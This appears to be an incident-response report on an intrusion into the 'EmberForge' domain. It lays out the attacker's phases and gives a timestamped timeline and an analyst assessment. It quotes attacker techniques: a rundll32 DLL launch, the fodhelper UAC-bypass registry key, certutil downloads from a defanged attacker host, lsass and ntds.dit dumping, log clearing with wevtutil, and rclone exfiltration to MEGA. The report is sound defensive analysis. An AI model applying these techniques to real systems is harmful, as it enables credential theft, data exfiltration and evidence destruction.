This intrusion was a multi-stage workstation-to-server-to-domain compromise that combined user execution, living-off-the-land techniques, credential access, lateral movement, remote administration tooling, and cloud-based exfiltration.

### Initial Access

The reviewed telemetry supports initial execution on the workstation after `lmartin` extracted an archive that produced `EmberForge_Review.iso`, mounted it, and triggered `D:\review.dll`.

### Execution

The first confirmed malicious execution was:

```text
"C:\Windows\System32\rundll32.exe" D:\review.dll,StartW
```

That activity was followed by deployment of `C:\Users\Public\update.exe`.

### Persistence

Persistence mechanisms observed in the reviewed telemetry included:

- Installation and configuration of `AnyDesk`
- A scheduled task named `WindowsUpdate` on the Domain Controller
- Creation of the backdoor account `svc_backup`

### Privilege Escalation

The attacker used the `fodhelper.exe` UAC bypass via:

```text
HKCU\Software\Classes\ms-settings\shell\open\command
DelegateExecute
```

### Defense Evasion

Defense evasion behavior included:

- Process injection
- Use of direct syscalls for credential dumping
- Service-based remote execution with random temporary service names
- Deletion of the Volume Shadow Copy after `ntds.dit` access
- Clearing of `Security` and `System` event logs with `wevtutil.exe`

### Credential Access

Credential access included:

- Creation of `C:\Windows\System32\lsass.dmp`
- Copying of `ntds.dit` from a shadow copy on the Domain Controller
- Exposure of plaintext credentials in process command lines

### Discovery

Discovery commands included:

```text
hostname
whoami /priv
net user /domain
net group "Domain Admins" /domain
nltest /dclist:emberforge.local
```

### Lateral Movement

Lateral movement included:

- Copying `update.exe` to `\\10.1.57.66\C$\Users\Public\update.exe`
- Share creation and SMB enablement
- Service-based remote execution on the server
- Share mapping on the Domain Controller using plaintext credentials

### Collection

Collection behavior centered on the server directory:

```text
C:\GameDev
```

That directory was compressed into:

```text
C:\Users\Public\gamedev.zip
```

### Command and Control

Command-and-control or beacon-like activity was observed through DNS queries from `C:\Users\Public\update.exe` to:

```text
cdn[.]cloud-endpoint[.]net
```

### Exfiltration

Exfiltration was performed with `rclone.exe` to MEGA using:

```text
mega:exfil
```

And network telemetry tied it to:

```text
bt5[.]api[.]mega[.]co[.]nz
66[.]203[.]125[.]15
```

## Technical Timeline

| Time (UTC) | Host | Activity |
|---|---|---|
| `2026-01-30 21:24:04.656` | `EC2AMAZ-B9GHHO6` | `7zG.exe` extracts content into `C:\Users\lmartin.EMBERFORGE\Downloads\EmberForge_Review\` |
| `2026-01-30 21:24:10.848` | `EC2AMAZ-B9GHHO6` | `EmberForge_Review.iso` created |
| `2026-01-30 21:27:03.300` | `EC2AMAZ-B9GHHO6` | `rundll32.exe` executes `D:\review.dll,StartW` |
| `2026-01-30 21:32:42.708` | `EC2AMAZ-B9GHHO6` | `rundll32.exe > notepad.exe` injection |
| `2026-01-30 21:36:34.586` | `EC2AMAZ-B9GHHO6` | `C:\Users\Public\update.exe` created |
| `2026-01-30 21:38:33.686` | `EC2AMAZ-B9GHHO6` | Registry hijack for `ms-settings\shell\open\command` begins |
| `2026-01-30 21:39:02.511` | `EC2AMAZ-B9GHHO6` | `fodhelper.exe` executes |
| `2026-01-30 21:40:24.206` | `EC2AMAZ-B9GHHO6` | `update.exe` begins querying `cdn[.]cloud-endpoint[.]net` |
| `2026-01-30 21:48:13.892` | `EC2AMAZ-B9GHHO6` | `Update.exe` creates `C:\Windows\System32\lsass.dmp` |
| `2026-01-30 21:56:44.706` | `EC2AMAZ-B9GHHO6` | `update.exe > spoolsv.exe (NT AUTHORITY\SYSTEM)` |
| `2026-01-30 22:07:45.9754850Z` | `EC2AMAZ-16V3AU4` | Temporary service `MzLblBFm` appears on server |
| `2026-01-30 22:10:52.789` | `EC2AMAZ-16V3AU4` | `certutil.exe` downloads `AnyDesk.exe` from `sync[.]cloud-endpoint[.]net` |
| `2026-01-30 22:14:55.324` | `EC2AMAZ-B9GHHO6` | `update.exe` copied to server over `\\10.1.57.66\C$` |
| `2026-01-30 22:17:01.4134194Z` | `EC2AMAZ-16V3AU4` | PowerShell `IWR` downloads `update.exe` on server |
| `2026-01-30 22:18:01.9717240Z` | `EC2AMAZ-16V3AU4` | `certutil.exe` downloads `update.exe` on server |
| `2026-01-30 22:19:34.895` | `EC2AMAZ-B9GHHO6` | `AnyDesk.exe` installed on workstation |
| `2026-01-30 22:51:36.903` | `EC2AMAZ-B9GHHO6` | `tools` share created on `C:\Users\Public` |
| `2026-01-30 22:54:09.948` | `EC2AMAZ-B9GHHO6` | Inbound SMB firewall rule added |
| `2026-01-30 23:08:28.665` | `EC2AMAZ-16V3AU4` | `rclone.exe` run with plaintext MEGA credentials |
| `2026-01-30 23:11:28.112` | `EC2AMAZ-16V3AU4` | `Compress-Archive` stages `C:\GameDev` into `gamedev.zip` |
| `2026-01-30 23:11:44.379` | `EC2AMAZ-16V3AU4` | `rclone.exe` uploads `gamedev.zip` to MEGA |
| `2026-01-30 23:12:53.154` | `EC2AMAZ-16V3AU4` | `rclone.exe` connects to `bt5[.]api[.]mega[.]co[.]nz` at `66[.]203[.]125[.]15` |
| `2026-01-30 23:19:21.118` | `EC2AMAZ-EEU3IA2` | First observed command on DC, `whoami` |
| `2026-01-30 23:34:56.069` | `EC2AMAZ-EEU3IA2` | `vssadmin list shadows /for=C:` |
| `2026-01-30 23:35:04.575` | `EC2AMAZ-EEU3IA2` | `vssadmin create shadow /For=C:` |
| `2026-01-30 23:35:15.307` | `EC2AMAZ-EEU3IA2` | `ntds.dit` copied from shadow copy |
| `2026-01-30 23:35:17.505` | `EC2AMAZ-EEU3IA2` | Shadow copy deleted |
| `2026-01-30 23:38:11.819` | `EC2AMAZ-EEU3IA2` | Domain user `svc_backup` created |
| `2026-01-30 23:39:37.986` | `EC2AMAZ-EEU3IA2` | `svc_backup` added to `Domain Admins` |
| `2026-01-30 23:45:25.132` | `EC2AMAZ-EEU3IA2` | `net use Z:` with plaintext `EMBERFORGE\Administrator` credentials |
| `2026-01-30 23:47:38.302` | `EC2AMAZ-EEU3IA2` | Scheduled task `WindowsUpdate` created |
| `2026-01-30 23:50:50.010` | `EC2AMAZ-EEU3IA2` | `wevtutil cl Security` |
| `2026-01-30 23:51:06.258` | `EC2AMAZ-EEU3IA2` | `wevtutil cl System` |
| `2026-01-30 23:52:00.378` | `EC2AMAZ-EEU3IA2` | `Security` log cleared again |

## Analyst Assessment

The reviewed telemetry is strong enough to support a defensible end-to-end intrusion narrative.

What can be stated with high confidence:

- The initial confirmed malicious execution occurred on `EC2AMAZ-B9GHHO6.emberforge.local`.
- `D:\review.dll` was the first clearly malicious payload execution observed.
- `C:\Users\Public\update.exe` became the primary follow-on payload.
- The attacker achieved local privilege escalation, performed credential access, and injected into `spoolsv.exe` as `SYSTEM`.
- The attacker moved laterally to the server and targeted `C:\GameDev`.
- `C:\GameDev` was compressed and uploaded to MEGA using `rclone.exe`.
- The Domain Controller was compromised, and `ntds.dit` was copied from a shadow copy.
- The attacker created domain persistence and attempted to reduce evidence by clearing logs.

What remains less certain from the reviewed notes:

- The full origin of the archive that produced `EmberForge_Review.iso` wasn't reconstructed before extraction.
- `AnyDesk` was clearly installed and configured, but the reviewed telemetry doesn't fully show the extent of interactive use.
- No alternate exfiltration path was confirmed in the reviewed dataset, but that shouldn't be treated as proof that none existed outside the reviewed time window or telemetry source.

